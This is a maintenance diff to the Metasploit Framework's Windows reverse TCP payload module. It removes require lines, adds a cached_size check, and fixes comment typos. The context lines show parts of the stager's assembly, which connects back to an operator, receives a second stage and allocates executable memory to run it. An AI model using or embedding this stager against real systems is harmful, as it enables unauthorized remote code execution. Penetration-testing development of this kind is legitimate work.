@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-
 module Msf
 
 ###
@@ -44,7 +38,7 @@ module Payload::Windows::ReverseTcp
     }
 
     # Generate the advanced stager if we have space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = ds['EXITFUNC']
       conf[:reliable] = true
     end
@@ -130,7 +124,7 @@ module Payload::Windows::ReverseTcp
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
-        push esp                ; push a pointer to this stuct
+        push esp                ; push a pointer to this struct
         push eax                ; push the wVersionRequested parameter
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp                ; WSAStartup( 0x0190, &WSAData );
@@ -168,7 +162,7 @@ module Payload::Windows::ReverseTcp
                                ; to cater for both IPv4 and IPv6
         loop push_0_loop
 
-                         ; bind to 0.0.0.0/[::], pushed above 
+                         ; bind to 0.0.0.0/[::], pushed above
         push #{encoded_bind_port}   ; family AF_INET and port number
         mov esi, esp           ; save a pointer to sockaddr_in struct
         push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
@@ -181,7 +175,7 @@ module Payload::Windows::ReverseTcp
         mov esi, esp
       ^
     end
-    
+
     asm << %Q^
       try_connect:
         push 16                 ; length of the sockaddr struct
@@ -213,7 +207,7 @@ module Payload::Windows::ReverseTcp
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
     ^
@@ -255,7 +249,7 @@ module Payload::Windows::ReverseTcp
         mov esi, [esi]          ; dereference the pointer to the second stage length
         push 0x40               ; PAGE_EXECUTE_READWRITE
         push 0x1000             ; MEM_COMMIT
-        push esi                ; push the newly recieved second stage length.
+        push esi                ; push the newly received second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
